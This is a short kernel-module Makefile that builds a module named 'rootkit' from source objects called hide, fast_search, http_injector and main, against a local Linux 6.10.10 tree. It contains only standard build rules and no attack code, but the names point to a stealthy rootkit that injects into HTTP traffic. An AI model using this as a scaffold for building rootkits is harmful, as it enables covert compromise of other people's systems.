obj-m += rootkit.o

rootkit-objs := hide.o fast_search.o http_injector.o main.o


KDIR 		:= $(PWD)/../linux-6.10.10
SRC_DIR		:= $(PWD)
FS_DIR		:= $(PWD)/../fs/lib/secret

default: 
	$(MAKE) -C $(KDIR) M=$(SRC_DIR) modules

clean:
	$(MAKE) -C $(KDIR) M=$(SRC_DIR) clean
